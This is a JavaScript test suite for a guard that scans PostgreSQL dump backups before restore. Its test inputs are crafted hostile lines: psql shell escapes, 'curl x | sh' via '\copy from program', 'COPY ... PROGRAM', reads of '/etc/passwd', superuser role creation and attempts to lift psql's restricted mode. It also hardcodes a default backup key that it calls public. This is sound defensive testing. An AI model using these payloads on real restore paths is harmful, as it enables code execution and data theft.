'use strict';
// 2.0.4 (security S3): a company file is a pg_dump run through `psql -f` as the database superuser, and the default key of a company file is public.
// These tests build CRAFTED dumps for every way a script can run a program on the user's machine, and prove the real dumps still pass.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const g = require('../src/sql-guard');

const HEAD = `--\n-- PostgreSQL database dump\n--\n\n\\restrict aBcDeF0123456789aBcDeF0123456789\n\nSET statement_timeout = 0;\nSET client_encoding = 'UTF8';\nSET standard_conforming_strings = on;\nSELECT pg_catalog.set_config('search_path', '', false);\n`;
const TAIL = `\n\\unrestrict aBcDeF0123456789aBcDeF0123456789\n`;
const GOOD_TABLE = `CREATE TABLE public.companies (\n    id uuid NOT NULL,\n    name text,\n    "weird\\name" text\n);\n`;
const GOOD_COPY = `COPY public.companies (id, name) FROM stdin;\n1111\tAcme \\N\n2222\tback\\\\slash \\t tab\n\\x41 starts with a backslash\n\\.\n`;
const GOOD_FN = `CREATE FUNCTION public.f(p text) RETURNS text\n    LANGUAGE plpgsql SECURITY DEFINER\n    SET search_path TO 'public', 'pg_temp'\n    AS $fn$\nBEGIN\n  IF p ~ '^select[\\s(*]' OR p ~ E'\\\\d+' THEN RETURN regexp_replace(p, '\\s+', ' '); END IF;\n  -- the word \\! in a comment, and session_replication_role read below\n  RETURN current_setting('session_replication_role');\nEND;\n$fn$;\n`;
const dump = (...parts) => HEAD + parts.join('\n') + TAIL;
const kinds = (sql) => [...new Set(g.scanDump(sql).findings.map((f) => f.kind))].sort();

test('what a real dump holds passes: pg_dump 17.6\'s \\restrict pair, SET lines, tables, COPY data full of backslashes (\\N, \\t, \\\\, a line starting \\x), a function whose body is full of regex backslashes, sequence values', () => {
  const sql = dump(GOOD_TABLE, GOOD_COPY, GOOD_FN, "SELECT pg_catalog.setval('public.companies_seq', 42, true);", 'ALTER TABLE ONLY public.companies ADD CONSTRAINT companies_pkey PRIMARY KEY (id);', "COMMENT ON TABLE public.companies IS 'it''s a \\ table';", 'CREATE INDEX i ON public.companies USING btree (name);', 'CREATE POLICY p ON public.companies FOR SELECT USING (true);', 'CREATE TRIGGER t BEFORE INSERT ON public.companies FOR EACH ROW EXECUTE FUNCTION public.f();');
  const r = g.scanDump(sql);
  assert.deepEqual(r.findings, []);
  assert.equal(r.copyBlocks, 1);
  assert.ok(r.statements >= 10);
  assert.doesNotThrow(() => g.assertSafeDump(sql));
});

test('the real dumps of this repository pass untouched (Sample.tcdb is a real company file)', async () => {
  const f = path.join(__dirname, '..', 'Sample.tcdb');
  if (!fs.existsSync(f)) return;
  const BM = require('../src/backup-manager');
  const bm = new BM({ pgBinDir: '/x', encryptionKey: 'texacore-default-backup-key-2026', backupPath: f });
  const sql = await bm._decompress(bm._decryptParsed(bm._parseTcdbFile(fs.readFileSync(f)), '').data);
  const t0 = Date.now();
  const r = g.scanDump(sql);
  assert.deepEqual(r.findings, [], JSON.stringify(r.findings.slice(0, 3)));
  assert.ok(r.copyBlocks > 100 && r.statements > 1000);
  assert.ok(Date.now() - t0 < 20000, 'a 12 MB dump is checked in well under 20 s');
});

test('psql meta-commands: every shape is refused - at line start, after SQL on the same line, after a comment, after a quoted string, right after the end of a COPY block, on the COPY line itself', () => {
  const cases = {
    shell: '\\! touch /tmp/pwned',
    copyProgram: '\\copy t from program \'curl x | sh\'',
    include: '\\i /etc/passwd',
    output: '\\o |sh',
    set: '\\set ON_ERROR_STOP 0',
    gexec: 'SELECT \'select 1\' \\gexec',
    sameLine: 'SELECT 1; \\! touch /tmp/pwned',
    afterComment: '/* x */ \\! touch /tmp/pwned',
    afterLineComment: 'SELECT 1; -- ok\n\\! touch /tmp/pwned',
    afterString: "SELECT 'a' \\! touch /tmp/pwned",
    afterStdString: "SELECT '\\'; \\! touch /tmp/pwned; --'",   // standard_conforming_strings=on: the string is just a backslash, the rest is a command
    afterDollar: 'SELECT $$x$$ \\! touch /tmp/pwned',
    afterDollarTag: 'SELECT $a$x$a$ \\! touch /tmp/pwned',
    afterIdent: 'SELECT "a" \\! touch /tmp/pwned',
    connect: '\\connect postgres',
    watch: 'SELECT 1 \\watch 1',
    restrictOther: '\\restrict',   // not the pg_dump shape (no key)
  };
  for (const [name, c] of Object.entries(cases)) {
    const k = kinds(dump(GOOD_TABLE, c));
    assert.ok(k.includes('meta-command'), `${name} must be refused (got ${JSON.stringify(k)})`);
  }
  // right after a COPY block: `\.` ends the data and the next line is a command again
  assert.ok(kinds(dump(`COPY public.companies (id) FROM stdin;\n1\n\\.\n\\! touch /tmp/pwned`)).includes('meta-command'));
  // on the COPY line itself - psql runs the rest of that line AFTER the data
  assert.ok(kinds(dump(`COPY public.companies (id) FROM stdin; \\! touch /tmp/pwned\n1\n\\.\n`)).includes('meta-command'));
  // a data block that "ends" early and carries a command inside what looks like data
  assert.ok(kinds(dump(`COPY public.companies (id) FROM stdin;\n1\n\\.\n\\! touch /tmp/pwned\n2\n\\.\n`)).includes('meta-command'));
  // the dump's own \unrestrict with ITS key, then a command: the pair is removed and the command still refused
  assert.ok(kinds(`\\restrict k1k1k1k1k1k1k1\n${GOOD_TABLE}\\unrestrict k1k1k1k1k1k1k1\n\\! touch /tmp/pwned\n`).includes('meta-command'));
});

test('backslashes that are DATA are fine: inside strings (standard and E\'\'), dollar quotes, "identifiers", comments and COPY rows', () => {
  const ok = [
    "SELECT 'a\\b';", "SELECT E'a\\\\b\\'c';", "SELECT $$ \\! not a command $$;", "SELECT $t$ \\copy $t$;", 'SELECT "a\\b";',
    '-- \\! in a comment\nSELECT 1;', '/* \\! in a /* nested */ block */ SELECT 1;',
  ].map((s) => `CREATE VIEW public.v AS ${s.replace(/;$/, '')};`);
  // (the SELECT inside CREATE VIEW is a view body, not a top-level SELECT)
  for (const s of ok) assert.deepEqual(kinds(dump(s)), [], s);
  assert.deepEqual(kinds(dump(`COPY public.companies (id) FROM stdin;\n\\N\n\\\\\n\\x\n\\ \n\\.\n`)), []);
});

test('COPY blocks are followed exactly: a line that merely STARTS like the end marker is ambiguous (refused), a block that never ends is refused, \\. inside a row is data', () => {
  assert.ok(kinds(dump(`COPY public.companies (id) FROM stdin;\n1\n\\.x\n\\! touch /tmp/pwned\n`)).includes('copy-ambiguous-end'));
  assert.ok(kinds(`${HEAD}COPY public.companies (id) FROM stdin;\n1\n2\n`).includes('copy-unterminated'));
  assert.deepEqual(kinds(dump(`COPY public.companies (id, name) FROM stdin;\n1\ta\\.b\n\\.\n`)), []);
  assert.deepEqual(kinds(dump(`COPY public.companies (id) FROM stdin;\r\n1\r\n\\.\r\n`)), [], 'Windows line endings');
});

test('server-side commands: COPY … PROGRAM / TO / FROM a file, ALTER SYSTEM, extensions, languages, files, foreign servers, roles, DO blocks, plain SELECTs, session settings', () => {
  const must = {
    'copy-program': ["COPY public.companies FROM PROGRAM 'id';", "COPY public.companies TO PROGRAM 'cat > /tmp/x';", "COPY (SELECT 1) TO PROGRAM 'sh';",
      "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''touch /tmp/x'''; END $$;"],
    'copy-to': ["COPY public.companies TO '/tmp/x';", 'COPY public.companies TO STDOUT;', 'COPY (SELECT 1) TO STDOUT;'],
    'copy-file': ["COPY public.companies FROM '/etc/passwd';"],
    'copy-shape': ['COPY public.companies FROM stdin WITH (FORMAT csv);'],
    'alter-system': ["ALTER SYSTEM SET archive_command = 'touch /tmp/x';"],
    extension: ['CREATE EXTENSION plpython3u;', 'CREATE EXTENSION IF NOT EXISTS "evil_ext" WITH SCHEMA public;'],
    language: ["CREATE FUNCTION public.f() RETURNS void LANGUAGE plpython3u AS $$ import os $$;", "CREATE LANGUAGE plperlu;", "CREATE FUNCTION public.f() RETURNS void LANGUAGE c AS '$libdir/evil', 'f';"],
    'file-function': ["CREATE VIEW public.v AS SELECT pg_read_file('/etc/passwd');", "ALTER TABLE public.t ADD CONSTRAINT c CHECK (lo_export(1, '/tmp/x') > 0);", "CREATE VIEW public.v AS SELECT dblink_exec('x', 'y');"],
    'server-object': ["CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'x');", 'CREATE SUBSCRIPTION s CONNECTION \'x\' PUBLICATION p;'],
    role: ["CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x';", "ALTER ROLE postgres PASSWORD 'x';", 'SET ROLE postgres;', 'SET SESSION AUTHORIZATION postgres;'],
    setting: ['SET standard_conforming_strings = off;', "SET client_encoding = 'SJIS';", "SELECT pg_catalog.set_config('client_encoding', 'SJIS', false);", "SET session_replication_role = 'replica', default_transaction_read_only = on;", "LOAD '/tmp/evil.so';"],
    statement: ["DO $$ BEGIN PERFORM 1; END $$;", "SELECT pg_sleep(1);", "SELECT version();", 'DROP TABLE public.companies;', 'TRUNCATE public.companies;', 'DELETE FROM public.companies;', "UPDATE public.companies SET name = 'x';",
      "SELECT pg_catalog.setval((SELECT 'x'), 1, true);", 'VACUUM;', 'CALL public.p();', 'BEGIN;', 'GRANT postgres TO evil;'],
  };
  for (const [kind, list] of Object.entries(must)) {
    for (const s of list) assert.ok(kinds(dump(s)).includes(kind), `${kind}: ${s}  (got ${JSON.stringify(kinds(dump(s)))})`);
  }
  // an extension TexaCore ships is fine; so are the lines a real dump needs
  assert.deepEqual(kinds(dump('CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA public;')), []);
});

test('the statement boundary is psql\'s: ";" inside strings / dollar quotes / comments does not hide a second statement; a statement without its final ";" is still checked', () => {
  assert.ok(kinds(dump("SELECT 'a;b'; DO $$ BEGIN END $$;")).includes('statement'));
  assert.ok(kinds(dump("CREATE VIEW public.v AS SELECT 1; ALTER SYSTEM SET x = 1;")).includes('alter-system'));
  assert.ok(kinds(`${HEAD}DO $$ BEGIN END $$`).includes('statement'), 'no final semicolon');
  assert.deepEqual(kinds(dump("CREATE VIEW public.v AS SELECT 'a;b' AS x;")), []);
  assert.deepEqual(kinds(dump("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT 1; SELECT 2; END;")), [], 'a SQL-standard function body has its own semicolons');
  assert.ok(kinds(dump('SELECT 1 /* never closed')).includes('unterminated'));
  assert.ok(kinds(dump("SELECT 'never closed")).includes('unterminated'));
});

test('assertSafeDump: TCDB_UNSAFE_SQL with the KINDS and LINES only - the offending text is never in the message or the findings', () => {
  const secret = 'touch /tmp/SECRET_PAYLOAD_9f31';
  let err;
  try { g.assertSafeDump(dump(GOOD_TABLE, `\\! ${secret}`)); } catch (e) { err = e; }
  assert.ok(err); assert.equal(err.code, 'TCDB_UNSAFE_SQL');
  assert.ok(!err.message.includes('SECRET_PAYLOAD'));
  assert.ok(!JSON.stringify(err.findings).includes('SECRET_PAYLOAD'));
  assert.deepEqual(Object.keys(err.findings[0]).sort(), ['kind', 'line']);
  assert.match(err.message, /لا تصدر عن TexaCore/);
  assert.match(err.message, /never writes/);
});

test('prepareDump: the file author\'s own \\restrict / \\unrestrict lines are gone (their key protects nothing), the program\'s own random pair wraps everything, before/after go inside', () => {
  const sql = dump(GOOD_TABLE);
  const a = g.prepareDump(sql, { before: "SET session_replication_role = 'replica';\n", after: "\nSET session_replication_role = 'origin';" }).toString('utf8');
  const b = g.prepareDump(sql).toString('utf8');
  assert.ok(!a.includes('aBcDeF0123456789aBcDeF0123456789'), 'the file\'s key is not used');
  const first = /^\\restrict ([0-9a-f]{48})\n/.exec(a);
  assert.ok(first, 'starts with the program\'s own \\restrict');
  assert.ok(a.trimEnd().endsWith(`\\unrestrict ${first[1]}`), 'ends with the matching \\unrestrict');
  assert.equal((a.match(/\\restrict/g) || []).length, 1);
  assert.equal((a.match(/\\unrestrict/g) || []).length, 1);
  assert.ok(a.indexOf("SET session_replication_role = 'replica';") < a.indexOf('CREATE TABLE public.companies'));
  assert.notEqual(/^\\restrict ([0-9a-f]+)/.exec(b)[1], first[1], 'a fresh key every time');
  assert.ok(a.includes('CREATE TABLE public.companies'));
});

// ── psql itself, on a throw-away cluster made with the bundled binaries (macOS arm64 development machines only) ──
const PG = path.join(__dirname, '..', 'bin', 'macos-arm64', 'pg', 'bin');
const haveBundledPg = process.platform === 'darwin' && process.arch === 'arm64' && fs.existsSync(path.join(PG, 'initdb')) && fs.existsSync(path.join(PG, 'psql'));
test('end to end with the bundled psql 17.6: a crafted dump cannot run a command - the guard refuses it AND psql\'s own restricted mode would; a good dump loads through the program\'s wrapper', { skip: !haveBundledPg && 'needs the bundled macOS PostgreSQL', timeout: 120000 }, async () => {
  const { execFileSync, spawn } = require('child_process');
  const { mkdtemp } = require('./helpers');
  const dir = mkdtemp('tcx-sqlg-');
  const data = path.join(dir, 'data');
  const port = 45000 + Math.floor(Math.random() * 3000);
  execFileSync(path.join(PG, 'initdb'), ['-D', data, '-U', 'postgres', '--auth=trust', '-E', 'UTF8', '--no-sync'], { stdio: 'ignore' });
  const srv = spawn(path.join(PG, 'postgres'), ['-D', data, '-p', String(port), '-k', dir, '-c', 'listen_addresses=127.0.0.1', '-c', 'fsync=off'], { stdio: 'ignore' });
  try {
    for (let i = 0; i < 100; i++) { try { execFileSync(path.join(PG, 'pg_isready'), ['-h', '127.0.0.1', '-p', String(port)], { stdio: 'ignore' }); break; } catch { await new Promise((r) => setTimeout(r, 100)); } }
    const run = (file) => {
      const r = require('child_process').spawnSync(path.join(PG, 'psql'), ['-X', '-h', '127.0.0.1', '-p', String(port), '-U', 'postgres', '-d', 'postgres', '-f', file, '--set', 'ON_ERROR_STOP=off'], { encoding: 'utf8' });
      return { out: String(r.stdout || ''), err: String(r.stderr || '') };
    };
    const marker = path.join(dir, 'PWNED');
    // control: without restricted mode the meta-command REALLY runs (this is the vector)
    const evil = path.join(dir, 'evil.sql'); fs.writeFileSync(evil, `CREATE TABLE t1(id int);\n\\! touch ${marker}\n`);
    run(evil);
    assert.ok(fs.existsSync(marker), 'control: an unguarded dump runs a shell command');
    fs.unlinkSync(marker);
    // the guard refuses it before psql ever sees it
    assert.throws(() => g.assertSafeDump(fs.readFileSync(evil)), (e) => e.code === 'TCDB_UNSAFE_SQL');
    // belt and braces: even if a command slipped past the scanner, the program's wrapper runs psql in restricted mode
    const wrapped = path.join(dir, 'wrapped.sql'); fs.writeFileSync(wrapped, g.prepareDump(`CREATE TABLE t2(id int);\n\\! touch ${marker}\n`));
    const r = run(wrapped);
    assert.ok(!fs.existsSync(marker), 'restricted mode: the command did not run');
    assert.match(r.err + r.out, /restricted/i);
    // the file author's own \unrestrict with a guessed key cannot lift the program's restriction
    const lift = path.join(dir, 'lift.sql'); fs.writeFileSync(lift, g.prepareDump(`\\unrestrict aBcDeF0123456789aBcDeF0123456789\n\\! touch ${marker}\n`).toString('utf8').replace(/\n\\unrestrict aBcDeF0123456789aBcDeF0123456789\n/, '\n'));
    // (the file's own pair is stripped by prepareDump; a second, unstripped variant:)
    const lift2 = path.join(dir, 'lift2.sql'); fs.writeFileSync(lift2, `\\restrict zzzzzzzzzzzzzzzz\n\\unrestrict aBcDeF0123456789aBcDeF0123456789\n\\! touch ${marker}\n`);
    run(lift); run(lift2);
    assert.ok(!fs.existsSync(marker));
    // a good dump (the shapes pg_dump writes) loads through the wrapper, COPY data included
    const good = path.join(dir, 'good.sql');
    fs.writeFileSync(good, g.prepareDump(dump('CREATE TABLE public.companies (id text, name text);', "COPY public.companies (id, name) FROM stdin;\n1\tAcme \\N\n2\ta\\\\b\n\\.\n", "SELECT pg_catalog.setval('pg_class_oid_nonexistent_ok', 1, true);").toString().split('\\unrestrict')[0], { before: "SET session_replication_role = 'replica';\n", after: "\nSET session_replication_role = 'origin';" }));
    run(good);
    const count = execFileSync(path.join(PG, 'psql'), ['-X', '-h', '127.0.0.1', '-p', String(port), '-U', 'postgres', '-d', 'postgres', '-tAc', 'select count(*) from public.companies'], { encoding: 'utf8' }).trim();
    assert.equal(count, '2');
  } finally {
    srv.kill('SIGTERM');
    await new Promise((r) => setTimeout(r, 400));
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ── the restore itself: a crafted file is refused BEFORE anything is touched ──
test('BackupManager.restore refuses a crafted .tcdb with TCDB_UNSAFE_SQL: no truncate, no psql, the database is not marked as touched, the file is unchanged', async () => {
  const BackupManager = require('../src/backup-manager');
  const { mkdtemp } = require('./helpers');
  const dir = mkdtemp('tcx-sqlg-r-');
  const bm = new BackupManager({ pgBinDir: path.join(dir, 'no-such-pg'), encryptionKey: 'k-test-1234', backupPath: path.join(dir, 'x.tcdb'), dataDir: dir, onProgress: () => {}, onError: () => {} });
  const mk = async (sql) => {
    const raw = Buffer.from(sql, 'utf8');
    const compressed = await bm._compress(raw);
    const file = bm._buildTcdbFile(bm._encrypt(compressed), raw.length, compressed.length);
    const f = path.join(dir, `f${Math.random().toString(16).slice(2)}.tcdb`);
    fs.writeFileSync(f, file);
    return f;
  };
  let truncated = 0; let ranPsql = 0;
  bm._truncatePublic = async () => { truncated++; };
  bm._executeSql = async () => { ranPsql++; return { copyErrors: [] }; };
  const evilFile = await mk(`-- Dumped from database version 17.6\n${dump(GOOD_TABLE, GOOD_COPY.replace('FROM stdin', 'FROM stdin'), '\\! touch /tmp/should-never-exist-9f31')}`);
  const before = fs.readFileSync(evilFile);
  await assert.rejects(() => bm.restore(evilFile), (e) => e.code === 'TCDB_UNSAFE_SQL' && /never writes/.test(e.message));
  assert.equal(truncated, 0, 'nothing was truncated');
  assert.equal(ranPsql, 0, 'psql never ran');
  assert.equal(bm.lastRestoreTouchedDb, false, 'the database was not touched (afterFailedRestore puts the previous company back)');
  assert.ok(fs.readFileSync(evilFile).equals(before), 'the file is unchanged');
  assert.equal(fs.existsSync('/tmp/should-never-exist-9f31'), false);
  // a 1.x file (written by PostgreSQL < 17) that also carries a command: the clearer 1.x refusal comes first (both change nothing)
  const legacyFile = await mk(`-- Dumped from database version 15.4\n${dump(GOOD_TABLE, '\\! touch /tmp/should-never-exist-9f31')}`);
  await assert.rejects(() => bm.restore(legacyFile), (e) => e.code === 'LEGACY_TCDB');
  // a COPY … PROGRAM file too
  const prog = await mk(`-- Dumped from database version 17.6\n${dump(GOOD_TABLE, "COPY public.companies FROM PROGRAM 'touch /tmp/should-never-exist-9f31';")}`);
  await assert.rejects(() => bm.restore(prog), (e) => e.code === 'TCDB_UNSAFE_SQL');
  assert.equal(truncated, 0);
});

test('the wiring: the guard sits between decompress and the first destructive step; every psql the restore starts reads no ~/.psqlrc (-X); the program\'s files are wrapped in psql\'s restricted mode', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'backup-manager.js'), 'utf8');
  const rf = src.indexOf('async _restoreFile(');
  const decompress = src.indexOf('const sql = await this._decompress(compressed);', rf);
  const legacy = src.indexOf('throw BackupManager.legacyFileError(dumpedFrom);', rf);
  const guard = src.indexOf('sqlGuard.assertSafeDump(sql);', rf);
  const truncate = src.indexOf('await this._truncatePublic(this._extractCopyTables(sqlStr));', rf);
  assert.ok(decompress > rf && legacy > decompress && guard > legacy && truncate > guard, 'decompress → 1.x check (its own clearer refusal) → guard → truncate');
  assert.equal((src.match(/'-X'/g) || []).length, 4, 'restore, scalar query, truncate, auth: all -X');
  assert.match(src, /sqlGuard\.prepareDump\(sqlBuffer, \{ before: "SET session_replication_role = 'replica';\\n"/);
  assert.match(src, /sqlGuard\.prepareDump\(sqlText\)/);
  const main = fs.readFileSync(path.join(__dirname, '..', 'src', 'main.js'), 'utf8');
  assert.match(main, /TCDB_UNSAFE_SQL: 422/);
});

test('preflightBuffer / peekDumpMajor: the upload and the open-in-place routes refuse an unsafe file BEFORE writing or re-pointing anything; a 1.x file just reports its major; a clean file reports 17', async () => {
  const BackupManager = require('../src/backup-manager');
  const { mkdtemp } = require('./helpers');
  const dir = mkdtemp('tcx-sqlg-p-');
  const bm = new BackupManager({ pgBinDir: path.join(dir, 'x'), encryptionKey: 'k-test-1234', backupPath: path.join(dir, 'x.tcdb'), dataDir: dir, onProgress: () => {}, onError: () => {} });
  const mk = async (sql) => { const raw = Buffer.from(sql, 'utf8'); const c = await bm._compress(raw); return bm._buildTcdbFile(bm._encrypt(c), raw.length, c.length); };
  assert.equal(await bm.preflightBuffer(await mk(`-- Dumped from database version 17.6\n${dump(GOOD_TABLE, GOOD_COPY)}`)), 17);
  const unsafeBuf = await mk(`-- Dumped from database version 17.6\n${dump('\\! touch /tmp/x')}`);
  await assert.rejects(() => bm.preflightBuffer(unsafeBuf), (e) => e.code === 'TCDB_UNSAFE_SQL');
  assert.equal(await bm.preflightBuffer(await mk(`-- Dumped from database version 15.4\n${dump('\\! touch /tmp/x')}`)), 15, 'a 1.x file reports its major (the caller refuses it with the 1.x text)');
  const f = path.join(dir, 'p.tcdb'); fs.writeFileSync(f, await mk(`-- Dumped from database version 17.6\n${dump('COPY public.companies FROM PROGRAM \'id\';')}`));
  await assert.rejects(() => bm.peekDumpMajor(f), (e) => e.code === 'TCDB_UNSAFE_SQL');
  const main = fs.readFileSync(path.join(__dirname, '..', 'src', 'main.js'), 'utf8');
  assert.match(main, /const major = await pm\.preflightBuffer\(fileData, \{ passphrase \}\);\s*if \(major !== null && major < 17\) throw BackupManager\.legacyFileError\(major\);/);
  const peek = main.indexOf('await backupManager.peekDumpMajor(selectedPath, { passphrase })');
  const repoint = main.indexOf('backupManager.backupPath = liveTarget;');
  assert.ok(peek > 0 && repoint > peek, 'the open-in-place route reads the file for commands before it re-points the manager');
});
